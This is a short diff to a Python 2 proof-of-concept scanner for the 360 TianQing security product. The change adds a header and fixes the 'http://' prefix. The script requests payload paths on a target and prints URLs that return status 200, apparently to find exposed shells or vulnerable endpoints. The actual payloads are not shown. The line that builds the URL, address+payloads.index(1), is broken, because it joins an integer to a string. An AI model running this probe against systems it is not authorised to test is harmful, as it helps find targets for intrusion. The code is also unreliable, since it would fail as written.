@@ -1,4 +1,13 @@
 # coding:utf-8
+# python2
+
+'''
+@Project    : POC
+@File       : 360TianQing_Scan.py
+@Author     : LiC
+@Date       : 2021/8/6 21:09
+'''
+
 
 import requests
 
@@ -12,7 +21,7 @@ def checkShell():
     return  code
 
 if "http" not in address:
-    address="http"+address
+    address="http://"+address
 else:
     address=address
 
@@ -24,7 +33,6 @@ result2=requests.get(address+payloads.index(1))
 
 if result2.status_code==200:
     print address+payloads.index(1)
-
 
 
 
